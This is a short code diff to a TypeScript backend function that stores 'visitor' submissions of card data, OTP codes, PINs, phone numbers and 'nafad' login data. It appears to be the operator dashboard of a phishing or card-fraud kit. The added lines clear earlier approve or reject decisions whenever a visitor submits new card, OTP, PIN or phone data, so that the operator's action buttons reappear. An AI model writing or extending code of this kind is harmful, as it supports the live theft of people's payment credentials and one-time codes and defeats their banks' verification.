@@ -561,6 +561,9 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}, options
   );
   if (hasNewCardData && !mergedPayload._v1UpdatedAt) {
     mergedPayload._v1UpdatedAt = now;
+    // Clear old decision when new card data is submitted - this enables buttons to show
+    mergedPayload._v1Status = null;
+    mergedPayload.paymentStatus = null;
   }
 
   // Auto-add _v5UpdatedAt ONLY if OTP data is in the CURRENT payload and differs from existing visitor data
@@ -573,6 +576,9 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}, options
   );
   if (hasNewOtpData && !mergedPayload._v5UpdatedAt) {
     mergedPayload._v5UpdatedAt = now;
+    // Clear old decision when new OTP data is submitted - this enables buttons to show
+    mergedPayload._v5Status = null;
+    mergedPayload.otpStatus = null;
   }
 
   // Auto-add _v6UpdatedAt ONLY if PIN data is in the CURRENT payload and differs from existing visitor data
@@ -584,6 +590,9 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}, options
   );
   if (hasNewPinData && !mergedPayload._v6UpdatedAt) {
     mergedPayload._v6UpdatedAt = now;
+    // Clear old decision when new PIN data is submitted - this enables buttons to show
+    mergedPayload._v6Status = null;
+    mergedPayload.pinStatus = null;
   }
 
   // Auto-add _v7UpdatedAt ONLY if phone data is in the CURRENT payload and differs from existing visitor data
@@ -597,6 +606,9 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}, options
   );
   if (hasNewPhoneData && !mergedPayload._v7UpdatedAt) {
     mergedPayload._v7UpdatedAt = now;
+    // Clear old decision when new phone data is submitted - this enables buttons to show
+    mergedPayload.phoneOtpStatus = null;
+    mergedPayload.phoneStatus = null;
   }
 
   // Auto-add nafadUpdatedAt ONLY if nafad data is in the CURRENT payload and differs from existing visitor data
